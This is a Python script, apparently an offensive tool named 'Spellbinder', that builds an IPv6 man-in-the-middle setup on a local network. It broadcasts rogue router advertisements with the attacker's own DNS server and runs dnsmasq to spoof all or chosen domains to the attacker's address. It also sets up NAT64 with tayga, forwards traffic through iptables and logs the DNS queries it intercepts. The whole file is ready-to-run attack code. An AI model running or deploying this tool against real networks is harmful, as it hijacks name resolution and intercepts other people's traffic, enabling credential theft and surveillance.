#!/usr/bin/python

import subprocess
import os
import sys
import signal
import time
import threading
import shutil


class SpellbinderState:
    """Tracks runtime state for clean teardown."""
    def __init__(self):
        self.dnsmasq_process = None
        self.interface = None
        self.dip6 = None
        self.tayga6ip = None
        self.tayga_ip4 = None
        self.dns_mode = 1
        self.dnsmasq_conf_backup = None
        self.iptables_v4_backup = None
        self.iptables_v6_backup = None
        self.stop_event = threading.Event()


STATE = SpellbinderState()

TAYGA_INTERFACE = "nat64"
DIP6CIDR = "64"
TAYGA4SUBNET = "192.168.255.0/24"
DNSMASQ_SPOOF_CONF = "/etc/dnsmasq.d/spellbinder.conf"
UPSTREAM_DNS = "8.8.8.8"
DNS_LOG_PATH = "/tmp/spellbinder_dns.log"


def run(cmd, check=True, allow_fail=False):
    print(f"[+] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, check=False, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        if allow_fail:
            print(f"[!] Warning: command returned non-zero exit ({result.returncode}): {' '.join(cmd)}")
            if result.stderr.strip():
                print(f"[!] STDERR: {result.stderr.strip()}")
        elif check:
            raise subprocess.CalledProcessError(result.returncode, cmd, result.stdout, result.stderr)
    return result


def check_root():
    if os.geteuid() != 0:
        sys.exit("[-] Must run as root.")


def prevent_service_persistence():
    print("[+] Disabling services to prevent auto-restart on boot...")
    run(["systemctl", "disable", "--now", "radvd"], allow_fail=True)
    run(["systemctl", "disable", "--now", "dnsmasq"], allow_fail=True)
    run(["systemctl", "disable", "--now", "tayga.service"], allow_fail=True)


def derive_nat64_prefix(dip6):
    """Derive NAT64 prefix from the user's routable IPv6 prefix."""
    base = dip6.split("::")[0]
    return f"{base}:FFFF::/96"


def prompt_inputs():
    interface = input("Enter the interface to listen on (default eth0): ").strip() or "eth0"
    routable_ip = input("Enter the global IPv6 address to assign (e.g., fd00:dead:beef::2): ").strip() or "fd00:dead:beef::2"
    tayga_ip6 = input("Enter the NAT64 IPv6 address (e.g., fd00:dead:beef::3): ").strip() or "fd00:dead:beef::3"
    tayga_ip4 = input("Enter the NAT64 IPv4 address (e.g., 192.168.255.1): ").strip() or "192.168.255.1"

    while True:
        raw = input("Select DNS mode: [1] Spoof all to attacker IPv6 (default)  [2] Relay to 8.8.8.8  [3] Targeted spoof: ").strip() or "1"
        try:
            dns_mode = int(raw)
            if dns_mode in (1, 2, 3):
                break
            print("[-] Please enter 1, 2, or 3.")
        except ValueError:
            print("[-] Invalid input. Please enter 1, 2, or 3.")

    spoof_domains = []
    if dns_mode == 3:
        raw_domains = input("Enter domains to spoof (comma-separated, e.g., evil.corp,updates.target.com): ").strip()
        if raw_domains:
            spoof_domains = [d.strip() for d in raw_domains.split(",") if d.strip()]
        if not spoof_domains:
            print("[-] No domains provided. Falling back to full spoof mode.")
            dns_mode = 1

    return interface, routable_ip, tayga_ip6, tayga_ip4, dns_mode, spoof_domains


def backup_dnsmasq_conf():
    conf_path = "/etc/dnsmasq.conf"
    if os.path.exists(conf_path):
        backup_path = conf_path + ".spellbinder.bak"
        shutil.copy2(conf_path, backup_path)
        STATE.dnsmasq_conf_backup = backup_path
        print(f"[+] Backed up {conf_path} to {backup_path}")


def restore_dnsmasq_conf():
    conf_path = "/etc/dnsmasq.conf"
    if STATE.dnsmasq_conf_backup and os.path.exists(STATE.dnsmasq_conf_backup):
        shutil.copy2(STATE.dnsmasq_conf_backup, conf_path)
        os.remove(STATE.dnsmasq_conf_backup)
        STATE.dnsmasq_conf_backup = None
        print(f"[+] Restored {conf_path} from backup.")


def sanitize_dnsmasq_conf():
    conf_path = "/etc/dnsmasq.conf"
    if not os.path.exists(conf_path):
        return
    with open(conf_path, "r") as f:
        lines = f.readlines()
    keywords = ["no-resolv", "log-queries", "log-facility", "interface", "bind-interfaces", "address", "server"]
    with open(conf_path, "w") as f:
        for line in lines:
            if any(line.strip().startswith(k) for k in keywords):
                f.write(f"# {line}")
            else:
                f.write(line)
    print("[+] Sanitized /etc/dnsmasq.conf to avoid directive conflicts.")


def load_ipv6_module():
    run(["modprobe", "ipv6"])


def enable_forwarding():
    run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"])


def save_iptables():
    """Save current iptables rules for restoration on cleanup."""
    v4 = subprocess.run(["iptables-save"], capture_output=True, text=True)
    if v4.returncode == 0:
        STATE.iptables_v4_backup = v4.stdout
        print("[+] Saved iptables (v4) rules.")
    v6 = subprocess.run(["ip6tables-save"], capture_output=True, text=True)
    if v6.returncode == 0:
        STATE.iptables_v6_backup = v6.stdout
        print("[+] Saved ip6tables (v6) rules.")


def restore_iptables():
    """Restore iptables rules from backup."""
    if STATE.iptables_v4_backup:
        proc = subprocess.run(["iptables-restore"], input=STATE.iptables_v4_backup, capture_output=True, text=True)
        if proc.returncode == 0:
            print("[+] Restored iptables (v4) rules.")
        else:
            print(f"[!] Failed to restore iptables v4: {proc.stderr.strip()}")
            run(["iptables", "-F"], allow_fail=True)
            run(["iptables", "-X"], allow_fail=True)
    else:
        run(["iptables", "-F"], allow_fail=True)
        run(["iptables", "-X"], allow_fail=True)

    if STATE.iptables_v6_backup:
        proc = subprocess.run(["ip6tables-restore"], input=STATE.iptables_v6_backup, capture_output=True, text=True)
        if proc.returncode == 0:
            print("[+] Restored ip6tables (v6) rules.")
        else:
            print(f"[!] Failed to restore ip6tables v6: {proc.stderr.strip()}")
            run(["ip6tables", "-F"], allow_fail=True)
            run(["ip6tables", "-X"], allow_fail=True)
    else:
        run(["ip6tables", "-F"], allow_fail=True)
        run(["ip6tables", "-X"], allow_fail=True)


def clear_iptables():
    run(["iptables", "-F"])
    run(["iptables", "-X"])
    run(["ip6tables", "-F"])
    run(["ip6tables", "-X"])


def set_iptables_forwarding(dinterface, dns_mode):
    run(["iptables", "-I", "FORWARD", "-j", "ACCEPT", "-i", TAYGA_INTERFACE, "-o", dinterface])
    run(["iptables", "-I", "FORWARD", "-j", "ACCEPT", "-i", dinterface, "-o", TAYGA_INTERFACE, "-m", "state", "--state", "RELATED,ESTABLISHED"])
    run(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", dinterface, "-j", "MASQUERADE"])
    run(["ip6tables", "-A", "OUTPUT", "-p", "icmpv6", "--icmpv6-type", "1", "-j", "DROP"])
    if dns_mode == 2:
        run(["iptables", "-A", "OUTPUT", "-p", "udp", "--dport", "53", "-d", UPSTREAM_DNS, "-j", "ACCEPT"], allow_fail=True)


def write_file(path, content, mode=0o644):
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
    with os.fdopen(fd, "w") as f:
        f.write(content)
    print(f"[+] Wrote {path}")


def configure_tayga(tayga_ip4, nat64_prefix):
    config = f"""tun-device {TAYGA_INTERFACE}
ipv4-addr {tayga_ip4}
prefix  {nat64_prefix}
dynamic-pool {TAYGA4SUBNET}
"""
    write_file("/etc/tayga.conf", config)


def configure_radvd(dinterface, dip6):
    base_prefix = dip6.split("::")[0] + "::"
    config = f"""interface {dinterface}
{{
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvHomeAgentFlag off;
    AdvOtherConfigFlag on;
    prefix {base_prefix}/{DIP6CIDR}
    {{
        AdvOnLink on;
        AdvAutonomous on;
        AdvRouterAddr off;
    }};
    RDNSS {dip6}
    {{
        AdvRDNSSLifetime 30;
    }};
}};
"""
    write_file("/etc/radvd.conf", config)


def configure_dnsmasq(dip6, interface, mode, spoof_domains=None):
    if os.path.exists(DNSMASQ_SPOOF_CONF):
        os.remove(DNSMASQ_SPOOF_CONF)
        print("[*] Removed previous dnsmasq config to avoid conflicts.")

    if mode == 2:
        config = f"""log-queries
log-facility={DNS_LOG_PATH}
bind-interfaces
listen-address=::1
interface={interface}
server={UPSTREAM_DNS}
"""
        print("[*] DNS mode: RELAY via 8.8.8.8")
    elif mode == 3:
        lines = [
            f"server={UPSTREAM_DNS}",
            "log-queries",
            f"log-facility={DNS_LOG_PATH}",
            "bind-interfaces",
            f"interface={interface}",
        ]
        for domain in (spoof_domains or []):
            lines.append(f"address=/{domain}/{dip6}")
        config = "\n".join(lines) + "\n"
        print(f"[*] DNS mode: TARGETED SPOOF for {', '.join(spoof_domains or [])} — relay all others")
    else:
        config = f"""no-resolv
log-queries
log-facility={DNS_LOG_PATH}
bind-interfaces
interface={interface}
address=/#/{dip6}
"""
        print("[*] DNS mode: SPOOF all responses to attacker IPv6")

    write_file(DNSMASQ_SPOOF_CONF, config)
    print("[+] Testing dnsmasq config...")
    test_result = subprocess.run(["dnsmasq", "-C", DNSMASQ_SPOOF_CONF, "--test"], capture_output=True, text=True)
    if test_result.returncode != 0:
        print("[-] dnsmasq config test failed:")
        print(test_result.stderr.strip())
        sys.exit(1)
    else:
        print("[+] dnsmasq config test passed.")


def start_dnsmasq():
    print("[+] Killing any existing dnsmasq services (systemd)...")
    run(["systemctl", "stop", "dnsmasq"], allow_fail=True)
    STATE.dnsmasq_process = subprocess.Popen(["dnsmasq", "-k", "-C", DNSMASQ_SPOOF_CONF],
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
    print(f"[+] dnsmasq started with PID {STATE.dnsmasq_process.pid}")


def stop_dnsmasq():
    if STATE.dnsmasq_process and STATE.dnsmasq_process.poll() is None:
        STATE.dnsmasq_process.terminate()
        STATE.dnsmasq_process.wait()
        print("[+] dnsmasq terminated.")


def log_dns_queries():
    print("[+] Starting DNS query logger...")
    timeout = 5
    waited = 0
    while not os.path.exists(DNS_LOG_PATH):
        if STATE.stop_event.is_set():
            return
        time.sleep(0.5)
        waited += 0.5
        if waited >= timeout:
            print("[!] DNS log file not found after waiting.")
            return
    with open(DNS_LOG_PATH, "r") as f:
        f.seek(0, os.SEEK_END)
        while not STATE.stop_event.is_set():
            line = f.readline()
            if not line:
                time.sleep(0.2)
                continue
            if "query" in line:
                print(f"[DNS] {line.strip()}")


def setup_nat64(dinterface, dip6, tayga6ip, tayga_ip4, nat64_prefix):
    run(["ip", "addr", "add", f"{dip6}/{DIP6CIDR}", "dev", dinterface], allow_fail=True)
    run(["ip", "addr", "add", "fe80::1", "dev", dinterface], allow_fail=True)
    run(["tayga", "--mktun"], allow_fail=True)
    run(["ip", "link", "set", TAYGA_INTERFACE, "up"])
    run(["ip", "addr", "add", tayga6ip, "dev", TAYGA_INTERFACE], allow_fail=True)
    run(["ip", "addr", "add", tayga_ip4, "dev", TAYGA_INTERFACE], allow_fail=True)
    run(["ip", "route", "add", TAYGA4SUBNET, "dev", TAYGA_INTERFACE], allow_fail=True)
    run(["ip", "route", "add", nat64_prefix, "dev", TAYGA_INTERFACE], allow_fail=True)
    print("[+] NAT64 setup complete.")


def restart_services():
    run(["systemctl", "restart", "radvd"], allow_fail=True)
    run(["tayga"], allow_fail=True)


def cleanup(signum=None, frame=None):
    print("\n[!] Caught exit signal. Cleaning up...")
    STATE.stop_event.set()
    stop_dnsmasq()

    print("[+] Restoring iptables rules...")
    restore_iptables()

    print("[+] Stopping radvd and tayga services...")
    run(["systemctl", "stop", "radvd"], allow_fail=True)
    run(["pkill", "tayga"], allow_fail=True)

    print("[+] Removing NAT64 TUN interface and assigned IPs...")
    if STATE.interface and STATE.dip6:
        run(["ip", "addr", "del", f"{STATE.dip6}/{DIP6CIDR}", "dev", STATE.interface], allow_fail=True)
    run(["ip", "link", "delete", TAYGA_INTERFACE], allow_fail=True)

    if os.path.exists(DNSMASQ_SPOOF_CONF):
        os.remove(DNSMASQ_SPOOF_CONF)
        print("[+] Removed spellbinder dnsmasq config.")

    restore_dnsmasq_conf()

    if os.path.exists(DNS_LOG_PATH):
        os.remove(DNS_LOG_PATH)
        print("[+] Removed temp DNS log.")

    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)


def main():
    check_root()
    print("[+] Initializing hardened IPv6 MITM infrastructure")
    prevent_service_persistence()

    dinterface, dip6, tayga6ip, tayga_ip4, dns_mode, spoof_domains = prompt_inputs()
    nat64_prefix = derive_nat64_prefix(dip6)

    STATE.interface = dinterface
    STATE.dip6 = dip6
    STATE.tayga6ip = tayga6ip
    STATE.tayga_ip4 = tayga_ip4
    STATE.dns_mode = dns_mode

    signal.signal(signal.SIGINT, cleanup)

    save_iptables()
    backup_dnsmasq_conf()
    sanitize_dnsmasq_conf()

    load_ipv6_module()
    enable_forwarding()
    clear_iptables()

    configure_dnsmasq(dip6, dinterface, dns_mode, spoof_domains)
    configure_radvd(dinterface, dip6)
    configure_tayga(tayga_ip4, nat64_prefix)
    setup_nat64(dinterface, dip6, tayga6ip, tayga_ip4, nat64_prefix)
    set_iptables_forwarding(dinterface, dns_mode)
    restart_services()
    start_dnsmasq()

    threading.Thread(target=log_dns_queries, daemon=True).start()
    print(f"[+] NAT64 prefix: {nat64_prefix}")
    print("[+] IPv6 MITM setup complete. Press Ctrl+C to exit and clean up.")

    while not STATE.stop_event.is_set():
        time.sleep(1)


if __name__ == "__main__":
    main()
